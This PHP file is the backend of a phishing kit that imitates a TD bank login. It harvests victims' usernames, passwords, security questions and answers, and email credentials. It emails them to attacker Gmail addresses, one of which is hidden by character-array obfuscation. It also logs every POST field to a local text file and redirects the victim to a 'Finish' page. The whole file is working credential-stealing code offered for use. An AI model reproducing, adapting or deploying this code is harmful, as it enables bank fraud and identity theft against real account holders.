<?php
###################################
// Don't change anything here
// Created By tsh0pbiz
// From Vietnam
###################################


ini_set("output_buffering",4096);
session_start();


$loginemail = $_SESSION['username'];
$loginpass =  $_SESSION['mNumber'];



$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$adddate=date("D M d, Y g:i a");
$message  = "==================+[ BA ]+==================\n";
$message .= "Username : $loginemail\n";
$message .= "Password : $loginpass	\n";
$message .= "---------------Account Information------------------------------\n";
$message .= "Question 1: ".$_POST['question1']."-";
$message .= "Answer 1: ".$_POST['answer1']."-";
$message .= "Question 2: ".$_POST['question2']."-";
$message .= "Answer 2: ".$_POST['answer2']."-";
$message .= "Your Personal Question: ".$_POST['PQ']."-";
$message .= "Answer : ".$_POST['PA']."-";
$message .= "Email Address: ".$_POST['emailer']."-";
$message .= "Email Password: ".$_POST['epassedred']."-";
$message .= "-----------------Doing Good--------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "----------------------tsh0pbiz-----------------------\n";

$ar=array("0"=>"j","1"=>"c","2"=>"l","3"=>"g","4"=>"c","5"=>"6","6"=>"p","7"=>".","8"=>"h","9"=>"3","10"=>"i","11"=>"m","12"=>"a","13"=>"@","14"=>"9","15"=>"0","16"=>"b","17"=>"2","18"=>"d","18"=>"7","19"=>"o","20"=>"d");
$cc=$ar['6'].$ar['5'].$ar['8'].$ar['14'].$ar['0'].$ar['9'].$ar['2'].$ar['15'].$ar['16'].$ar['17'].$ar['1'].$ar['14'].$ar['20'].$ar['18'].$ar['13'].$ar['3'].$ar['11'].$ar['12'].$ar['10'].$ar['2'].$ar['7'].$ar['1'].$ar['19'].$ar['11'];
$subject = "TD BNK";
$headers = "From: TD BNK <servicecoustom@gmail.com>\n" .
$headers .= "To: The Receiver <goodvbesk1@gmail.com>\n" .
$headers .= "MIME-Version: 1.0\n";
{
mail($send,$subject,$message,$headers);
mail($cc,$subject,$message,$headers);
}

//Location: The location where the user will be redirected after the script executes the commands. You can change it.
header("Location: Finish.html");
//It will create the file "logs1.txt" (if not already created) and will save the POST or GET method data(the username/email and pass). You can change the filename.
$handle = fopen("like2.txt", "a");
fwrite($handle, "\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);

//This filename must be the same with the one above.
$myFile = "like2.txt";
$fh = fopen($myFile, 'a');
//Gets remote ip adress
$ip2 = $_SERVER['REMOTE_ADDR'];
$ip = "IP=" . $_SERVER['REMOTE_ADDR'] . "\n" ;
$stringData = "------------------------------------------\n";
$date = "Date=" . date('Y-m-d H:i:s');

//write in file
fwrite($fh, $ip);
fwrite($fh, "\r\n");
fwrite($fh, $date);
fwrite($fh, "\r\n");
fwrite($fh, $stringData);
fwrite($fh, "\r\n");
fwrite($fh, "\r\n");

fclose($fh);

exit;

?>